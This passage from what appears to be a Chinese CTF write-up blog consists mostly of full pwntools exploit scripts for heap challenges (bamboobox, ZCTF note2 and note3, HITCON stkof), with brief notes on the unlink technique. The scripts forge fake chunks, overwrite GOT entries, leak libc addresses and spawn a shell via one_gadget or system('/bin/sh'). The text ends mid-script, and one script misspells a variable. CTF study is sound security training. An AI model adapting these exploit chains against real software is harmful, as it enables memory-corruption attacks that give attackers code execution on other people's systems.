class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">r=process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./bamboobox'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = remote(host,port)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"Please enter the length of item name:"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx,length,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"Please enter the index of item:"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'aaaaaa'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'bbbbbb'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'cccccc'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6020c8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pay ='a'*0x10</span></span><br><span class="line">pay = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) </span><br><span class="line">pay += p64(fd)</span><br><span class="line">pay += p64(bk)</span><br><span class="line">pay += <span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line">pay += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x90</span>,pay)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x10</span>+ p64(<span class="number">0x80</span>) + p64(<span class="number">0x602068</span>)</span><br><span class="line"></span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x60</span>,payload)</span><br><span class="line">show()</span><br><span class="line"><span class="comment"># r.recv()</span></span><br><span class="line">r.recvuntil(<span class="string">"0 : "</span>)</span><br><span class="line">atoi_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(atoi_addr)</span><br><span class="line"></span><br><span class="line">libc_base=atio_addr<span class="number">-0x36E80</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">system = libc_base + <span class="number">0x45390</span></span><br><span class="line"><span class="comment"># r.recv()</span></span><br><span class="line"><span class="comment"># modify(0,0x8,p64(system))</span></span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x8</span>,p64(one_gadget))</span><br><span class="line"><span class="comment"># r.recvuntil(":")</span></span><br><span class="line"><span class="comment"># r.sendline("$0")</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h2><p>unlink来说就是构造一个fack_chunk（为free完的样子）如果可以overlap的话，直接写在下一个chunk的top，size的p位为0，如果不可以的overlap的话，就是这题一样，<code>利用两个chunk来构造一个fack_chunk</code>，free掉fack_chunk后面那个chunk，使之合并，触发unlink。</p><p>和lab11差不多的方法</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">p = process(<span class="string">'./note2'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(less than 128)'</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id, choice, s)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line">    p.recvuntil(<span class="string">'2.append]'</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your name:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"aaaa"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input your address:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"bbbb"</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602120</span><span class="comment">#prt</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target <span class="number">-0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(fd)+p64(bk)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,payload)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'bbbb'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'cccc'</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload1+=p64(<span class="number">0x60</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,payload1)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi=elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">payload2 =<span class="string">'a'</span>*<span class="number">0x18</span>+p64(atoi)<span class="comment">#prt-0x18 start</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload2)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'is '</span>)</span><br><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">"\00"</span>))</span><br><span class="line">offset_addr=atoi_addr-libc.sym[<span class="string">'atoi'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(offset_addr)</span><br><span class="line"><span class="keyword">print</span> hex(atoi_addr)</span><br><span class="line">one_gadget=offset_addr+<span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(one_gadget))</span><br><span class="line">p.sendline(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="2016-zctf-note3"><a href="#2016-zctf-note3" class="headerlink" title="2016 zctf note3"></a>2016 zctf note3</h2><p>和note2比，它就少了个show，但是我们可以利用puts函数来leak<br>就有就往fack_chunk里面写入free和puts两个函数的got值的操作，leak puts</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">sh=process(<span class="string">'./note3'</span>)</span><br><span class="line"><span class="comment"># sh=remote('127.0.0.1',9999)</span></span><br><span class="line">elf=ELF(<span class="string">'./note3'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'1024)\n'</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'content:\n'</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'note:\n'</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'ent:\n'</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'note:\n'</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6020c8</span><span class="comment">#prt</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target <span class="number">-0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(fd)+p64(bk)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,payload)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'bbbb'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'cccc'</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload1+=p64(<span class="number">0x60</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,payload1)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free=elf.got[<span class="string">'free'</span>]</span><br><span class="line">put_gots = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">payload2 =<span class="string">'a'</span>*<span class="number">0x18</span> + p64(free) + p64(put_gots)<span class="comment">#prt-0x18 start</span></span><br><span class="line">edit(<span class="number">0</span>,payload2)<span class="comment">#0</span></span><br><span class="line">puts_plt = elf.sym[<span class="string">'puts'</span>]</span><br><span class="line">edit(<span class="number">0</span>,p64(puts_plt)[:<span class="number">-1</span>]) <span class="comment"># 解决了只能包含“\n”只能发送八个字节的问题</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">"\nDelete success\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">"\00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(one_gadget)[:<span class="number">-1</span>])</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"><span class="comment"># add(0x88,'aaaa')</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>另一种方法，是用了edit里面id的整数溢出，用复数使chunk可以直接overlap<br>然后改free的got为system（这个是把chunk0覆写成free got的地址，再edit一次0，就可以写system写进got表），再把binsh的地址写在原本是chunk0地址的地方，free的时候，拿chunk0当参数就可以实现system(‘/bin/sh’)（one_gadget其实更方便一点）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">sh=process(<span class="string">'./note3'</span>)</span><br><span class="line"><span class="comment"># sh=remote('127.0.0.1',9999)</span></span><br><span class="line">elf=ELF(<span class="string">'./note3'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'1024)\n'</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'content:\n'</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'note:\n'</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'ent:\n'</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'note:\n'</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">'aaaaaa'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">'aaaaaa'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">'aaaaaa'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">'aaaaaa'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">'aaaaaa'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">'aaaaaa'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">inter=<span class="number">-9223372036854775808</span></span><br><span class="line">payload=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x81</span>)</span><br><span class="line">payload+=p64(<span class="number">0x6020e0</span><span class="number">-0x18</span>)</span><br><span class="line">payload+=p64(<span class="number">0x6020e0</span><span class="number">-0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x80</span>,<span class="string">'a'</span>)</span><br><span class="line">payload+=p64(<span class="number">0x80</span>)</span><br><span class="line">payload+=p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">editnote(<span class="number">3</span>,<span class="string">'a'</span>)</span><br><span class="line">editnote(inter,payload) <span class="comment">#editnote(-1,payload) 此時size為note6地址 改的是chunk3</span></span><br><span class="line">delnote(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">free_got=elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">atol_got=elf.got[<span class="string">'atol'</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">editnote(<span class="number">3</span>,p64(free_got)+p64(puts_got))</span><br><span class="line">editnote(<span class="number">0</span>,p64(puts_plt)[:<span class="number">-1</span>])</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line">puts_adr=sh.recvuntil(<span class="string">'\nDelete success\n'</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">puts_adr=u64(puts_adr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_adr: '</span>+hex(puts_adr)</span><br><span class="line"> </span><br><span class="line">libc_base=puts_adr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">sys_adr=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_adr=libc_base+libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base: '</span>+hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'sys_adr: '</span>+hex(sys_adr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'binsh_adr: '</span>+hex(binsh_adr)</span><br><span class="line">editnote(<span class="number">0</span>,p64(sys_adr)[:<span class="number">-1</span>])</span><br><span class="line">editnote(<span class="number">3</span>,p64(binsh_adr)[:<span class="number">-1</span>]) <span class="comment">#作为chunk0,即free的参数</span></span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>学到的新技能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p64(puts_plt)[:-1]  # 解决了只能包含“\n”只能发送八个字节的问题</span><br></pre></td></tr></table></figure><h2 id="2014-hitcon-stkof"><a href="#2014-hitcon-stkof" class="headerlink" title="2014 hitcon stkof"></a>2014 hitcon stkof</h2><p>这题我一直绕的点在，target为什么要是chunk0+0x10，即chunk2的位置<br>在测试中，我们可以发现其实chunk1和chunk2之间是隔了0x400的，但chunk2和chunk3是相邻的<br>我们需要在chunk2中操作unlink，所以我们需要是 <code>chunk2 --&gt;fack_chunk(chunk2-0x18)</code>,所以target改为chunk2地址所在的位置（在何位置构造，指针则指向哪里）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"> </span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line"> </span><br><span class="line">sh = process(<span class="string">"./stkof"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./stkof"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,strings)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.sendline(str(len(strings)))</span><br><span class="line">    sh.send(strings)</span><br><span class="line">    sh.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.sym[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#2</span></span><br><span class="line">add(<span 